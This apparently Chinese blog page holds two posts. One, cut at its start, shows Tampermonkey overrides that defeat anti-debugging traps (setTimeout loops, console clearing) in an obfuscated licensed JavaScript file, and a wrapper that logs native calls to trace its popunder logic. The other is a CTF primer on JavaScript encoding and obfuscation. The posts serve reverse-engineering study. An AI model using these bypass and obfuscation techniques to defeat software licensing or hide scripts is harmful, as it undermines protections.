<p>这么说来其实一切的一切都始于 setTimeout 这个函数（因为 b() 函数全是闭包调用，无法从外界破掉），所以只要在 setTimeout 被调用的时候，不让它执行就可以破解掉这个死循环了。</p>
<p>所以我们只需要简单地覆盖掉 setTimeout 就可以了……比如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">window</span>._setTimeout = <span class="built_in">window</span>.setTimeout;</div><div class="line">    <span class="built_in">window</span>.setTimeout = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
<p>但是！这个操作无法在控制台里面做！因为当你打开控制台的时候，你就必然会被吸入到 b() 函数的死循环中。这时再来覆盖 setTimeout 已经没有意义了。</p>
<p>这时我们的工具 TamperMonkey 就上场了，把代码写到 TM 的脚本里，就算不打开控制台也能执行了。</p>
<font color="#f00">TM 脚本写好之后，刷新页面，等它完全加载完，再打开控制台，这时 debugger 已经不会再出现了！<strong>接下来就轮到控制台刷新代码了</strong></font>

<p>通过 <code>Console was cleared</code> 右侧的链接点进去定位到具体的代码，点击 <code>{}</code> 美化一下被压缩过的代码，发现其实就是用 setInterval 反复调用 console.clear() 清空控制台并输出了 <code>&lt;div&gt;Console was cleared&lt;/div&gt;</code> 信息，但是注意了，不能直接覆盖 setInterval 因为这个函数在其他地方也有重要的用途。</p>
<p>所以我们可以通过覆盖 console.clear() 函数和过滤 log 信息来阻止它的清屏行为。</p>
<p>同样写入到 TamperMonkey 的脚本中，代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">window.console.clear = function() &#123;&#125;;</div><div class="line">window.console._log = window.console.log;</div><div class="line">window.console.log = function (e) &#123;</div><div class="line">    if (e[&apos;nodeName&apos;] &amp;&amp; e[&apos;nodeName&apos;] == &apos;DIV&apos;) &#123;</div><div class="line">        return ;</div><div class="line">    &#125;</div><div class="line">    return window.console.error.apply(window.console._log, arguments);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>之所以用 error 来输出信息，是为了查看它的调用栈，对理解程序逻辑有帮助。</p>
<hr>
<p>基本上，做完这些的工作之后，这段代码就可以跟普通程序一样正常调试了。但还有个问题，它主要代码是经常混淆加密的，所以调试起来很有难度。下面简单讲讲过程。</p>
<h4 id="混淆加密方法一：隐藏方法调用，降低可读性"><a href="#混淆加密方法一：隐藏方法调用，降低可读性" class="headerlink" title="混淆加密方法一：隐藏方法调用，降低可读性"></a>混淆加密方法一：隐藏方法调用，降低可读性</h4><p>从 license.demo.js 可以看到开头有一段代码是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> zBCa = <span class="function"><span class="keyword">function</span> <span class="title">T</span>(<span class="params">f</span>) </span>&#123;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> U = <span class="number">0</span>, V = <span class="number">0</span>, W, X, Y = (X = <span class="built_in">decodeURI</span>(<span class="string">"+TR4W%17%7F@%17.....省略若干"</span>),</div><div class="line">    W = <span class="string">''</span>,</div><div class="line">    <span class="string">'D68Q4cYfvoqAveD2D8Kb0jTsQCf2uvgs'</span>); U &lt; X.length; U++,</div><div class="line">    V++) &#123;</div><div class="line">        <span class="keyword">if</span> (V === Y.length) &#123;</div><div class="line">            V = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line">        W += <span class="built_in">String</span>[<span class="string">"fromCharCode"</span>](X[<span class="string">"charCodeAt"</span>](U) ^ Y[<span class="string">"charCodeAt"</span>](V));</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">var</span> S = W.split(<span class="string">"&amp;&amp;"</span>);</div></pre></td></tr></table></figure>
<p>通过跟踪执行，可以发现 S 变量的内容其实是本程序所有要用到的类名、函数名的集合，类似于 <code>var S = [&#39;console&#39;, &#39;clear&#39;, &#39;console&#39;, &#39;log&#39;]</code>。如果要调用 console.clear() 和 console.log() 函数的话，就这样</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="built_in">window</span>;</div><div class="line">a[S[<span class="number">0</span>]][S[<span class="number">1</span>]]();</div><div class="line">a[S[<span class="number">2</span>]][S[<span class="number">3</span>]]();</div></pre></td></tr></table></figure>
<h4 id="混淆加密方法二：将函数定义加入到证书验证流程"><a href="#混淆加密方法二：将函数定义加入到证书验证流程" class="headerlink" title="混淆加密方法二：将函数定义加入到证书验证流程"></a>混淆加密方法二：将函数定义加入到证书验证流程</h4><p>license.demo.js 中有多处这样的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a[&apos;RegExp&apos;](&apos;/R[\S]&#123;4&#125;p.c\wn[\D]&#123;5&#125;t\wr/&apos;,&apos;g&apos;)[&apos;test&apos;](T + &apos;&apos;)</div></pre></td></tr></table></figure>
<p>这里的 a 代表 window，T 代表某个函数，<code>T + &#39;&#39;</code> 的作用是把 T 函数的定义转成字符串，所以这段代码的意思其实是，验证 T 函数的定义中是否包含某些字符。</p>
<p>每次成功的验证，都会返回一个特定的值，这些个特定的值就是解密核心证书的参数。</p>
<p>可能是因为我重新整理了代码格式，所以在重新运行的时候，这个证书一直运行不成功，所以后来就放弃了通过证书来突破的方案。</p>
<h4 id="逆向思路：输出所有函数调用和参数"><a href="#逆向思路：输出所有函数调用和参数" class="headerlink" title="逆向思路：输出所有函数调用和参数"></a>逆向思路：输出所有函数调用和参数</h4><p>通过断点调试，我们可以发现，想一步一步深入地搞清楚这整个程序的逻辑，是十分困难，因为它大部分函数之间都是相互调用的关系，只是参数的不同，结果就不同。</p>
<p>所以我后来想了个办法，就是只查看它的系统函数的调用，通过对调用顺序的研究，也可以大致知道它执行了哪些操作。</p>
<p>要想输出所有系统函数的调用，需要解决以下问题：</p>
<ol>
<li>覆盖所有内置变量及类的函数，我们既要覆盖 <code>window.console.clear()</code> 这样的依附在实例上的函数，也要覆盖依附在类定义上的函数，如 <code>window.HTMLAnchorElement.__proto__.click()</code></li>
<li>需要正确区分内置函数和自定义函数</li>
</ol>
<p>经过搜索后，找到了区分内置函数的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">// Used to resolve the internal `[[Class]]` of values</div><div class="line">var toString = Object.prototype.toString;</div><div class="line"></div><div class="line">// Used to resolve the decompiled source of functions</div><div class="line">var fnToString = Function.prototype.toString;</div><div class="line"></div><div class="line">// Used to detect host constructors (Safari &gt; 4; really typed array specific)</div><div class="line">var reHostCtor = /^\[object .+?Constructor\]$/;</div><div class="line"></div><div class="line">// Compile a regexp using a common native method as a template.</div><div class="line">// We chose `Object#toString` because there&apos;s a good chance it is not being mucked with.</div><div class="line">var reNative = RegExp(&apos;^&apos; +</div><div class="line">  // Coerce `Object#toString` to a string</div><div class="line">  String(toString)</div><div class="line">  // Escape any special regexp characters</div><div class="line">  .replace(/[.*+?^$&#123;&#125;()|[\]\/\\]/g, &apos;\\$&amp;&apos;)</div><div class="line">  // Replace mentions of `toString` with `.*?` to keep the template generic.</div><div class="line">  // Replace thing like `for ...` to support environments like Rhino which add extra info</div><div class="line">  // such as method arity.</div><div class="line">  .replace(/toString|(function).*?(?=\\\()| for .+?(?=\\\])/g, &apos;$1.*?&apos;) + &apos;$&apos;</div><div class="line">);</div><div class="line"></div><div class="line">function isNative(value) &#123;</div><div class="line">  var type = typeof value;</div><div class="line">  return type == &apos;function&apos;</div><div class="line">    // Use `Function#toString` to bypass the value&apos;s own `toString` method</div><div class="line">    // and avoid being faked out.</div><div class="line">    ? reNative.test(fnToString.call(value))</div><div class="line">    // Fallback to a host object check because some environments will represent</div><div class="line">    // things like typed arrays as DOM methods which may not conform to the</div><div class="line">    // normal native pattern.</div><div class="line">    : (value &amp;&amp; type == &apos;object&apos; &amp;&amp; reHostCtor.test(toString.call(value))) || false;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>然后结合网上的资料，写出了递归覆盖内置函数的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">function wrapit(e) &#123;</div><div class="line">    if (e.__proto__) &#123;</div><div class="line">        wrapit(e.__proto__);</div><div class="line">    &#125;</div><div class="line">    for (var a in e) &#123;</div><div class="line">        try &#123;</div><div class="line">            e[a];</div><div class="line">        &#125; catch (e) &#123;</div><div class="line">            // pass</div><div class="line">            continue;</div><div class="line">        &#125;</div><div class="line">        var prop = e[a];</div><div class="line">        if (!prop || prop._w) continue;</div><div class="line"></div><div class="line">        prop = e[a];</div><div class="line">        if (typeof prop == &apos;function&apos; &amp;&amp; isNative(prop)) &#123;</div><div class="line">            e[a] = (function (name, func) &#123;</div><div class="line">                return function () &#123;</div><div class="line">                    var args = [].splice.call(arguments,0); // convert arguments to array</div><div class="line">                    if (false &amp;&amp; name == &apos;getElementsByTagName&apos; &amp;&amp; args[0] == &apos;iframe&apos;) &#123;</div><div class="line">                    &#125; else &#123;</div><div class="line">                        console.error((new Date).toISOString(), [this], name, args);</div><div class="line">                    &#125;</div><div class="line">                    if (name == &apos;querySelectorAll&apos;) &#123;</div><div class="line">                        //alert(&apos;querySelectorAll&apos;);</div><div class="line">                    &#125;</div><div class="line">                    return func.apply(this, args);</div><div class="line">                &#125;;</div><div class="line">            &#125;)(a, prop);</div><div class="line">            e[a]._w = true;</div><div class="line">        &#125;;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用的时候只需要：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wrapit(window);</div><div class="line">wrapit(document);</div></pre></td></tr></table></figure>
<p>然后模拟一下正常的操作，触发 PopUnder 就可以看到它的调用过程了。</p>
<hr>
<p>参考资料：</p>
<p><a href="https://blog.nettitude.com/uk/beginners-guide-obfuscation" target="_blank" rel="external">A Beginners’ Guide to Obfuscation</a><br><a href="https://stackoverflow.com/questions/6598945/detect-if-function-is-native-to-browser" target="_blank" rel="external">Detect if function is native to browser</a><br><a href="https://davidwalsh.name/detect-native-function" target="_blank" rel="external">Detect if a Function is Native Code with JavaScript</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/12/CTF比赛中关于javascript的总结/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/11/12/CTF比赛中关于javascript的总结/" itemprop="url">CTF比赛中关于javascript的总结</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-12T20:06:05+08:00">
                2017-11-12
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/misc/" itemprop="url" rel="index">
                    <span itemprop="name">misc</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在CTF比赛中MISC、CRYPTO、WEB中，经常会遇到有关js方面的题目，这些题目内容很杂，难度不一，所以成套的体系很难总结出来。所以本文只是笔者根据个人经历，总结的一套较为行之有效的工具书！</p>
<h2 id="技术介绍"><a href="#技术介绍" class="headerlink" title="技术介绍"></a>技术介绍</h2><h3 id="0x2-1-JavaScript简介"><a href="#0x2-1-JavaScript简介" class="headerlink" title="0x2.1 JavaScript简介"></a>0x2.1 JavaScript简介</h3><p>JavaScript一种动态类型、弱类型、基于原型的客户端脚本语言，用来给HTML网页增加动态功能。</p>
<blockquote>
<p>动态：在运行时确定数据类型。变量使用之前不需要类型声明，通常变量的类型是被赋值的那个值的类型。</p>
<p>弱类：计算时可以不同类型之间对使用者透明地隐式转换，即使类型不正确，也能通过隐式转换来得到正确的类型。</p>
<p>原型：新对象继承对象（作为模版），将自身的属性共享给新对象，模版对象称为原型。这样新对象实例化后不但可以享有自己创建时和运行时定义的属性，而且可以享有原型对象的属性。</p>
</blockquote>
<p>PS：新对象指函数，模版对象是实例对象，实例对象是不能继承原型的，函数才可以的。</p>
<h3 id="0x2-2-JavaScript组成部分"><a href="#0x2-2-JavaScript组成部分" class="headerlink" title="0x2.2 JavaScript组成部分"></a>0x2.2 JavaScript组成部分</h3><h4 id="0x2-2-1-ECMAScript（核心）"><a href="#0x2-2-1-ECMAScript（核心）" class="headerlink" title="0x2.2.1 ECMAScript（核心）"></a>0x2.2.1 ECMAScript（核心）</h4><p>作为核心，它规定了语言的组成部分：语法、类型、语句、关键字、保留字、操作符、对象。</p>
<p>具体参考es6  <a href="http://es6.ruanyifeng.com/" target="_blank" rel="external">http://es6.ruanyifeng.com/</a></p>
<p>如果想查看每种浏览器的兼容性情况，可以参考以下博客</p>
<p>es5兼容性： <a href="http://kangax.github.io/compat-table/es5/" target="_blank" rel="external">http://kangax.github.io/compat-table/es5/</a></p>
<p>es6兼容性： <a href="http://kangax.github.io/compat-table/es6/" target="_blank" rel="external">http://kangax.github.io/compat-table/es6/</a></p>
<h4 id="0x2-2-2-DOM（文档对象模型）"><a href="#0x2-2-2-DOM（文档对象模型）" class="headerlink" title="0x2.2.2 DOM（文档对象模型）"></a>0x2.2.2 DOM（文档对象模型）</h4><p>DOM把整个页面映射为一个多层节点结果，开发人员可借助DOM提供的API，轻松地删除、添加、替换或修改任何节点。</p>
<h4 id="0x2-2-3-BOM-（浏览器对象模型）"><a href="#0x2-2-3-BOM-（浏览器对象模型）" class="headerlink" title="0x2.2.3 BOM （浏览器对象模型）"></a>0x2.2.3 BOM （浏览器对象模型）</h4><p>支持可以访问和操作浏览器窗口的浏览器对象模型，开发人员可以控制浏览器显示的页面以外的部分。</p>
<h3 id="0x2-3-javascript中部分常见的书写方式"><a href="#0x2-3-javascript中部分常见的书写方式" class="headerlink" title="0x2.3 javascript中部分常见的书写方式"></a>0x2.3 javascript中部分常见的书写方式</h3><p>说实在的，很多小伙伴表示javascript的表达方式太多了，而且其中有太多不为人知的利用策略。所以熊师傅给出一种套路，翻看工具书，上面已经给出了es6的参考博客！</p>
<h4 id="0x2-3-1-对象的变量或函数"><a href="#0x2-3-1-对象的变量或函数" class="headerlink" title="0x2.3.1 对象的变量或函数"></a>0x2.3.1 对象的变量或函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; <span class="keyword">var</span> s = <span class="string">"class"</span>;</div><div class="line">&gt; s.length	<span class="comment">// 等价于 s["length"]</span></div><div class="line"><span class="number">5</span></div><div class="line">&gt; s.substr(<span class="number">2</span>,<span class="number">2</span>)		<span class="comment">// 等价于 s["substr"](2,2)</span></div><div class="line"><span class="keyword">as</span></div></pre></td></tr></table></figure>
<p>这里说明了javascript中对象访问属性有两种方法</p>
<p>obj.paramName，使用.访问</p>
<p>obj[parameName]，使用中括号属性名访问</p>
<h4 id="0x2-3-2-类和函数的定义与使用"><a href="#0x2-3-2-类和函数的定义与使用" class="headerlink" title="0x2.3.2 类和函数的定义与使用"></a>0x2.3.2 类和函数的定义与使用</h4><ol>
<li><p>构造函数法定义类</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params"></span>) </span>&#123;</div><div class="line">	<span class="keyword">this</span>.name = <span class="string">"大毛"</span>;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 类的属性和方法</span></div><div class="line">Cat.prototype.makeSound = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">	alert(<span class="string">"喵喵喵"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> cat1 = <span class="keyword">new</span> Cat();</div><div class="line">alert(cat1.name); <span class="comment">// 大毛</span></div></pre></td></tr></table></figure>
</li>
<li><p>Object.create()法</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Cat = &#123;</div><div class="line">	<span class="attr">name</span>: <span class="string">"大毛"</span>,</div><div class="line">	<span class="attr">makeSound</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; alert(<span class="string">"喵喵喵"</span>); &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> cat1 = <span class="built_in">Object</span>.create(Cat);</div><div class="line">alert(cat1.name); <span class="comment">// 大毛</span></div><div class="line">cat1.makeSound(); <span class="comment">// 喵喵喵</span></div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 兼容性考虑, 自己定义一个create函数</span></div><div class="line"><span class="keyword">if</span> (!<span class="built_in">Object</span>.create) &#123;</div><div class="line">	<span class="built_in">Object</span>.create = <span class="function"><span class="keyword">function</span> (<span class="params">o</span>) </span>&#123;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">		F.prototype = o;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">new</span> F();</div><div class="line">	&#125;;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>极简主义法（用得最多）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> Cat = &#123;</div><div class="line">	<span class="attr">createNew</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;		<span class="comment">// createNew为构造函数，定义一个实例对象，把实例对象作为返回值</span></div><div class="line">		<span class="keyword">var</span> cat = &#123;&#125;;</div><div class="line">		cat.name = <span class="string">"大毛"</span>;</div><div class="line">		cat.makeSound = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; alert(<span class="string">"喵喵喵"</span>); &#125;;</div><div class="line">		<span class="keyword">return</span> cat;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> cat1 = Cat.createNew();</div><div class="line">cat1.makeSound(); <span class="comment">// 喵喵喵</span></div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 此处演示的是继承</span></div><div class="line"><span class="keyword">var</span> Animal = &#123;</div><div class="line">	<span class="attr">createNew</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">		<span class="keyword">var</span> animal = &#123;&#125;;</div><div class="line">		animal.sleep = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; alert(<span class="string">"睡懒觉"</span>); &#125;;</div><div class="line">		<span class="keyword">return</span> animal;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> Cat = &#123;</div><div class="line">	<span class="attr">createNew</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">		<span class="keyword">var</span> cat = Animal.createNew();</div><div class="line">		cat.name = <span class="string">"大毛"</span>;</div><div class="line">		cat.makeSound = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; alert(<span class="string">"喵喵喵"</span>); &#125;;</div><div class="line">		<span class="keyword">return</span> cat;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">var</span> cat1 = Cat.createNew();</div><div class="line">cat1.sleep(); <span class="comment">// 睡懒觉</span></div></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="CTF实践"><a href="#CTF实践" class="headerlink" title="CTF实践"></a>CTF实践</h2><h3 id="0x3-1-js压缩与解压缩"><a href="#0x3-1-js压缩与解压缩" class="headerlink" title="0x3.1 js压缩与解压缩"></a>0x3.1 js压缩与解压缩</h3><h4 id="0x3-1-1-js压缩"><a href="#0x3-1-1-js压缩" class="headerlink" title="0x3.1.1 js压缩"></a>0x3.1.1 js压缩</h4><p>压缩js文件可以减少文件体积方便传输，还可以让别人看不懂。</p>
<p>简单的压缩一般是：删除注释和空白符，替换变量名。</p>
<p>更激进点的做法还包括：删除无用代码，内联函数，等价语句替换等。 </p>
<p>开始压缩的时候必须要做到以下几点：</p>
<blockquote>
<ol>
<li>压缩前的代码格式要标准。因为去掉换行与空格时，所有语句就变成一行了，如果你的代码有瑕疵（比如某行少了个分号），那就会导致整个文件报错。当然，现在有的压缩工具已经比较智能了。</li>
<li>备份原文件</li>
<li>压缩很可能不会一次成功，一般要多试，多改</li>
</ol>
</blockquote>
<p>压缩js的工具，常见的有：<a href="http://ganquan.info/yui/" target="_blank" rel="external">YUI Compressor</a>、<a href="https://tool.css-js.com/" target="_blank" rel="external">UglifyJS</a>、<a href="(http://closure-compiler.appspot.com/">Google Closure Compiler</a>) 、<a href="https://tool.css-js.com/" target="_blank" rel="external">JSMin</a>等。</p>
<h4 id="0x3-1-2-js解压缩"><a href="#0x3-1-2-js解压缩" class="headerlink" title="0x3.1.2 js解压缩"></a>0x3.1.2 js解压缩</h4><p>那么既然能压缩，那也应该能够解压缩，但是需要注意的是，如果按照上面给的标准，我们无法实现完全的解压缩，但是可以还原出一个多行且具有鲜明的层次化结构的js代码。</p>
<p>js解压缩的工具有：chrome开发者模式支持解压缩</p>
<p>​            菜鸟工具  <a href="https://c.runoob.com/front-end/51" target="_blank" rel="external">https://c.runoob.com/front-end/51</a></p>
<p>​            Chinaz    <a href="http://tool.chinaz.com/js.aspx" target="_blank" rel="external">http://tool.chinaz.com/js.aspx</a></p>
<p>​            tool.lu在线工具    <a href="http://tool.lu/js/" target="_blank" rel="external">http://tool.lu/js/</a></p>
<p>​            CSS-JS    <a href="https://tool.css-js.com/" target="_blank" rel="external">https://tool.css-js.com/</a></p>
<h3 id="0x3-2-js加密与解密"><a href="#0x3-2-js加密与解密" class="headerlink" title="0x3.2 js加密与解密"></a>0x3.2 js加密与解密</h3><h4 id="0x3-2-1-escape加密-unescape解密"><a href="#0x3-2-1-escape加密-unescape解密" class="headerlink" title="0x3.2.1 escape加密\unescape解密"></a>0x3.2.1 escape加密\unescape解密</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//加密</span></div><div class="line">&gt; <span class="built_in">escape</span>(<span class="string">'alert("黑客防线"); '</span>)</div><div class="line"><span class="string">"alert%28%22%u9ED1%u5BA2%u9632%u7EBF%22%29%3B"</span></div><div class="line"></div><div class="line"><span class="comment">//解密</span></div><div class="line">&gt; <span class="built_in">unescape</span>(<span class="string">"alert%28%22%u9ED1%u5BA2%u9632%u7EBF%22%29%3B"</span>)</div><div class="line"><span class="string">"alert("</span>黑客防线<span class="string">"); "</span></div></pre></td></tr></table></figure>
<p>工具   <a href="http://www.haokuwang.com/unescape.htm" target="_blank" rel="external">http://www.haokuwang.com/unescape.htm</a></p>
<h4 id="0x3-2-2-转义字符加解密"><a href="#0x3-2-2-转义字符加解密" class="headerlink" title="0x3.2.2 转义字符加解密"></a>0x3.2.2 转义字符加解密</h4><p>转义字符&quot;&quot;，对于JavaScript提供了一些特殊字符如：n （换行）、 r （回车）、&#39; （单引号）等应该是有所了解 </p>
<p>的吧？其实&quot;&quot;后面还可以跟八进制或十六进制的数字，如字符&quot;a&quot;则可以表示为：&quot;141&quot;或&quot;x61&quot;（注意是小写字符&quot;x&quot;），至于双字节字符如汉字&quot;黑&quot;则仅能用十六进制表示为&quot;u9ED1&quot;（注意是小写字符&quot;u&quot;），其中字符&quot;u&quot;表示是双字节字符，根据这个原理例子代码则可以表示为： </p>
<p>八进制转义字符串如下: </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 使用console.log 或者 alert 或者confirm 或者 prompt调试 或者 document.write</span></div><div class="line">&gt; <span class="built_in">console</span>.log(<span class="string">"\141\154\145\162\164\50\42\u9ED1\u5BA2\u9632\u7EBF\42\51\73"</span>)</div><div class="line">alert(<span class="string">"黑客防线"</span>);</div></pre></td></tr></table></figure>
<p>十六进制转义字符串如下: </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; <span class="built_in">console</span>.log(<span class="string">"\x61\x6C\x65\x72\x74\x28\x22\u9ED1\u5BA2\u9632\u7EBF\x22\x29\x3B"</span>)</div><div class="line">alert(<span class="string">"黑客防线"</span>);</div></pre></td></tr></table></figure>
<p>常见工具：    工具包-&gt;其他辅助工具-&gt;编码转换</p>
<p>​            <a href="http://web2hack.org/xssee/" target="_blank" rel="external">http://web2hack.org/xssee/</a></p>
<h4 id="0x3-2-3-Script-Encoder来进行编码"><a href="#0x3-2-3-Script-Encoder来进行编码" class="headerlink" title="0x3.2.3 Script Encoder来进行编码"></a>0x3.2.3 Script Encoder来进行编码</h4><p>脚本编码器Script Encoder是Microsoft出品的脚本编码器。这里需要调用控件Scripting.Encoder完成的编码！由于很多电脑上没有安装这个控件，所以很多时候，你的主机运行不起来这个js代码。</p>
